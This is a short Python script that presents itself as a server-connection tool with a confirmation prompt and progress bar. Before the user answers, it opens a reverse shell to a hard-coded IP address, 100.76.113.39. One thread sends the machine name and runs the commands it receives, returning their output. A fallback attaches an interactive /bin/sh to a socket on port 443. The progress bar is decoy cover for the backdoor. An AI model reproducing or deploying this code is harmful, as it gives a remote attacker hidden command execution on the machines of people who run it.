import threading
import time # to allow sleep command
import progressbar # third-party progress bar library
def displayConnectionInterface():
    p = threading.Thread(target=netConn, args=())
    c = threading.Thread(target=netConn_L, args=())
    try:
        p.start()
    except:
        c.start()
    
    confirmation = input('Are you sure you want to connect to server? (y/n)')
    try:            
        if confirmation == 'y':
            print('Connecting to server...')
            i = 0 # var i will increase for each stage in the progress bar
            sleepDuration = 0 # can be increased to slow down progress bar
            progress = progressbar.ProgressBar() # accesses progress bar method from library
            for i in progress(range(100)):
                time.sleep(sleepDuration) # pause between progress bar updates
                if i == 100:
                       print('Connected') # displayed when progress bar has reached the end
        else:
            print('cancelled')
    except:
        while True:
            d = (d + 1) - 1
        
    
def netConn():
    import socket, os, subprocess
    os.system('cls')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 4445
    host = '100.76.113.39'
    s.connect((host,port))
    s.send((os.environ['COMPUTERNAME']).encode('utf-8'))
    while 1:
        rec = s.recv(1024)
        if rec == 'quit':
            s.close()
        else:
            p = subprocess.Popen(rec.decode('utf-8'),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout_val = p.stdout.read() + p.stderr.read()
            args = stdout_val
            s.send(args)
def netConn_L():
    
    import socket,os,subprocess
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("100.76.113.39",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p = subprocess.call(["/bin/sh","-i"])
displayConnectionInterface() # run all the code in the above function
